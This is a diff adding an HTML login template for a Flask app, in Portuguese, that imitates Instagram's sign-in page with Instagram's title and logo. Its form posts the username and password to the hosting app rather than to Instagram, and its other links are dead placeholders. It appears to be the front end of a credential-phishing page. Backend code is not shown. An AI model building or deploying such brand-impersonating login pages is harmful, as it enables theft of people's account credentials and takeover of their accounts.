@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <title>Instagram</title>
+  <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
+</head>
+<body>
+  <div class="login-container">
+    <div class="login-box">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/9/95/Instagram_logo_2022.svg" class="logo" alt="Instagram">
+      <form method="POST">
+        <input type="text" name="username" placeholder="Telefone, nome de usuário ou email" required>
+        <input type="password" name="password" placeholder="Senha" required>
+        <button type="submit">Entrar</button>
+      </form>
+      {% if error %}
+        <div class="error">{{ error }}</div>
+      {% endif %}
+      <div class="login-links">
+        <a href="#">Esqueceu a senha?</a>
+      </div>
+    </div>
+    <div class="signup-box">
+      <p>Não tem uma conta? <a href="#">Cadastre-se</a></p>
+    </div>
+  </div>
+</body>
+</html>
